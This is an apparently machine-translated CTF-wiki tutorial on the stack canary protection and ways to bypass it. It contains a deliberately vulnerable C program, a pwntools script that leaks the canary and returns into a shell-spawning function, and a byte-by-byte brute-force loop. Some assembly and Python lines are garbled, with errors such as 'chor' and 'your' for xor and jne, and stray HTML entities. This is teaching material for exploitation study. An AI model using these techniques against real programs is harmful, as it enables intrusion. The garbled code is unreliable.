[EN](./canary.md) | [ZH](./canary-zh.md)


# Canary



## Introduction 

Attacks caused by stack overflows are very common and very old. A mitigation technique called canary has long appeared in glibc and has been the first line of defense for system security.


Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack/buffer overflow is occur.


Canary and GS protection under Windows are effective means to prevent stack overflow. Its appearance largely prevents stack overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux. Match




## Canary Principle
### Using Canary in GCC
Canary can be set in GCC with the following parameters:


```

-fstack-protector enables protection, but only inserts protection for functions that have arrays in local variables
-fstack-protector-all Enable protection, insert protection for all functions
-fstack-protector-strong

-fstack-protector-explicit Only protects functions with explicit stack_protect attribute
-fno-stack-protector Disable protection.
```



### Canary Implementation Principle


The stack structure that enables Canary protection is as follows


```

        High

        Address |                 |

                +-----------------+

                | args            |

                +-----------------+

                | return address  |

                +-----------------+

        rbp =>  | old ebp         |

                +-----------------+

      rbp-8 =>  | canary value    |

                +-----------------+

| Local variables |
        Low     |                 |

        Address



```

When the program enables Canary compilation, the value at fs register 0x28 is taken in the prologue of the function and stored in the stack at %ebp-0x8.
This operation is to insert the Canary value into the stack, the code is as follows:
`` `asm
mov    rax, qword ptr fs:[0x28]

mov qword ptr [rbp-8], rax
```



This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs.


`` `asm
mov rdx, QWORD PTR [rbp-0x8]
chor rdx, QWORD PTR fs: 0x28
your 0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>

```



If the canary has been illegally modified, the program flow will go to `__stack_chk_fail`. `__stack_chk_fail` is also a function in glibc, which by default is delayed by ELF and is defined as follows.


```C

eglibc-2.19/debug/stack_chk_fail.c



void __attribute__ ((noreturn)) __stack_chk_fail (void)

{

  __fortify_fail ("stack smashing detected");

}



void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)

{

  /* The loop is added only to keep gcc happy.  */

  while (1)

    __libc_message (2, "*** %s ***: %s terminated\n",

                    msg, __libc_argv[0] ?: "<unknown>");

}

```



This means that you can hijack the process by hijacking the `__stack_chk_fail`&#39;s got value or leaking content with `__stack_chk_fail` (see stack smash).


Further, for Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack\_guard.
```C

typedef struct

{

  void *tcb;        /* Pointer to the TCB.  Not necessarily the

                       thread descriptor used by libpthread.  */

dtv_t * dtv;
  void *self;       /* Pointer to the thread descriptor.  */

  int multiple_threads;

  uintptr_t sysinfo;

  uintptr_t stack_guard;

  ...

} tcbhead_t;

```

A bypass protection mechanism can be implemented if there is an overflow that overrides the Canary value stored in TLS.


In fact, the value in TLS is initialized by the function security\_init.


```C

static void

security_init (void)

{

// The value of _dl_random is already written by the kernel when entering this function.
// glibc directly uses the value of _dl_random and does not assign it
// If you don&#39;t use this mode, glibc can also generate random numbers by itself.


/ / Set the last byte of _dl_random to 0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  

/ / Set the value of Canary to TLS
  THREAD_SET_STACK_GUARD (stack_chk_guard);



  _dl_random = NULL;

}



//THREAD_SET_STACK_GUARD macro is used to set TLS
#define THREAD_SET_STACK_GUARD(value) \

  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)



```





## Canary bypass technology


### Preface
Canary is a very effective vulnerability mitigation for stack overflow issues. But it does not mean that Canary can block all stack overflow exploits. Here is a common stack overflow exploit that exists in Canary. Please note that each method has specific environment requirements.

### Canary leaks Canary
Canary is designed to end in bytes `\x00`, which is meant to ensure that Canary can truncate strings.
The idea of leaking Canary in the stack is to overwrite the low byte of Canary to print out the remaining Canary part.
This type of utilization requires the existence of a suitable output function, and may require the first overflow to leak Canary, and then overflow the control execution flow again.


#### Using examples


The sample source code for the vulnerability is as follows:


```C

// ex2.c

#include <stdio.h>

#include <unistd.h>

#include <stdlib.h>

#include <string.h>

void getshell(void) {

    system("/bin/sh");

}

void init() {

    setbuf(stdin, NULL);

    setbuf(stdout, NULL);

    setbuf(stderr, NULL);

}

void vuln() {

    char buf[100];

    for(int i=0;i<2;i++){

        read(0, buf, 0x200);

        printf(buf);

    }

}

int main(void) {

    init();

    puts("Hello Hacker!");

vuln ();
    return 0;

}

```



Compile to 32bit program, open NX, ASLR, Canary protection


First print out the 4-digit Canary by overwriting the last `\x00` byte of Canary
After that, calculate the offset, fill Canary into the corresponding overflow position, and implement Ret into the getshell function.


```python

#!/usr/bin/env python



from pwn import *



context.binary = 'ex2'

#context.log_level = 'debug'

io = process (&#39;./ ex2&#39;)


get_shell = ELF("./ex2").sym["getshell"]



io.recvuntil (&quot;Hello Hacker!


# leak Canary

payload = "A"*100

io.sendline(payload)



io.recvuntil ( &quot;A&quot; * 100)
Canary = u32(io.recv(4))-0xa

log.info("Canary:"+hex(Canary))



# Bypass Canary

payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)

io.send(payload)



io.recv ()


io.interactive ()
```

### one-by-one 爆破 Canary



For Canary, not only is the Canary different after each process restart (the same as GS, GS is restarted), but the Canary of each thread in the same process is also different.
However, there is a class that opens the child process interaction through the fork function, because the fork function directly copies the memory of the parent process, so the Canary of each child process created is the same. We can use this feature to completely blast Canary byte by byte.
In the famous offset2libc bypassing all protected linux64bit articles, the author is using this way to blast the Canary:
This is the Python code for blasting:


```python

print "[+] Brute forcing stack canary "



start = len (p)
stop = len (p) +8


while len(p) < stop:

   for i in xrange(0,256):

      res = send2server(p + chr(i))



      if res != "":

         p = p + chr(i)

         #print "\t[+] Byte found 0x%02x" % i

         break



      if i == 255:

         print "[-] Exploit failed"

         sys.exit(-1)





canary = p[stop:start-1:-1].encode("hex")

print "   [+] SSP value is 0x%s" % canary

```





### Hijack __stack_chk_fail function
The processing logic that knows that Canary fails will enter the `__stack_chk_fail`ed function. The `__stack_chk_fail`ed function is a normal delay binding function that can be hijacked by modifying the GOT table.


See ZCTF2017 Login, using the GTS table of `__stack_chk_fail` by fsb vulnerability, and then using ROP


### Override the Canary value stored in TLS


It is known that Canary is stored in TLS and will be compared using this value before the function returns. When the overflow size is large, it can overwrite the Canary and TLS stored Canary implementations stored on the stack at the same time.


See StarCTF2018 babystack





